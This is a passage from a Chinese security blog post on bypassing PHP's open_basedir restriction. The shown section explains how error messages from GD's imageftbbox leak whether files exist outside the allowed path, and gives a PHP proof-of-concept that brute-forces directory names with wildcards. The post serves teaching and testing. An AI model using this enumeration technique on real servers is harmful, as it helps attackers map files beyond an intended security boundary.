+<h3 id="4-拓展库函数-GD库imageftbbox-imagefttext"><a href="#4-拓展库函数-GD库imageftbbox-imagefttext" class="headerlink" title="4. 拓展库函数: GD库imageftbbox&#x2F;imagefttext"></a>4. 拓展库函数: GD库imageftbbox&#x2F;imagefttext</h3><blockquote>
+<p>有加载对于库<br>这个方法报错的时候并不会把真正的路径爆出来，这也是其与realpath的最大不同之处。所以，我们只能一位一位地猜测，即使再windows下使用通配符&lt;&gt;都不可以</p>
+</blockquote>
+<ol>
+<li>GD库一般是PHP必备的扩展库之一</li>
+<li>拿imageftbbox举个例子，这个函数第三个参数是字体的路径。发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误 –&gt; <strong>盲注</strong></li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&#x27;isexists&#x27;</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span></span><br><span class="line">    <span class="comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span></span><br><span class="line">    <span class="title function_ invoke__">imageftbbox</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="variable">$file</span>, <span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$errstr</span>, <span class="string">&#x27;Invalid font filename&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&lt;br/&gt;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-ref"><span class="toc-number">1.</span> <span class="toc-text">bypass ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFopen-basedir"><span class="toc-number">2.</span> <span class="toc-text">什么是open_basedir?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">访问根目录绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%94%9F%E7%B1%BB-DirectoryIterator-glob"><span class="toc-number">3.1.</span> <span class="toc-text">1. 原生类: DirectoryIterator+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0-opendir-readdir-glob"><span class="toc-number">3.2.</span> <span class="toc-text">2. 函数: opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%87%BD%E6%95%B0-scandir-glob"><span class="toc-number">3.3.</span> <span class="toc-text">3. 函数: scandir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95"><span class="toc-number">4.</span> <span class="toc-text">访问任意目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0-symlink-mkdir-chdir-unlink"><span class="toc-number">4.1.</span> <span class="toc-text">1. 函数: symlink() + mkdir() + chdir() + unlink()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0-chdir-ini-set"><span class="toc-number">4.2.</span> <span class="toc-text">2. 函数: chdir() + ini_set()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">5.</span> <span class="toc-text">目录爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E5%AF%B9%E4%BA%8Ewindows-php%E6%9C%89%E7%94%A8%E7%9A%84%E9%80%9A%E9%85%8D%E7%AC%A6%E8%84%9A%E6%9C%AC"><span class="toc-number">5.1.</span> <span class="toc-text">0. *对于windows+php有用的通配符脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0-bindtextdomain"><span class="toc-number">5.2.</span> <span class="toc-text">1. 函数: bindtextdomain()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8E%9F%E7%94%9F%E7%B1%BB-SplFileInfo-getRealPath"><span class="toc-number">5.3.</span> <span class="toc-text">2. 原生类: SplFileInfo::getRealPath()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%87%BD%E6%95%B0-realpath-string-path-string-false"><span class="toc-number">5.4.</span> <span class="toc-text">3. 函数: realpath(string $path): string|false</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%8B%93%E5%B1%95%E5%BA%93%E5%87%BD%E6%95%B0-GD%E5%BA%93imageftbbox-imagefttext"><span class="toc-number">5.5.</span> <span class="toc-text">4. 拓展库函数: GD库imageftbbox&#x2F;imagefttext</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&text=php的open_basedir绕过"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&is_video=false&description=php的open_basedir绕过"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php的open_basedir绕过&body=Check out this article: https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&title=php的open_basedir绕过"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&name=php的open_basedir绕过&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/&t=php的open_basedir绕过"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
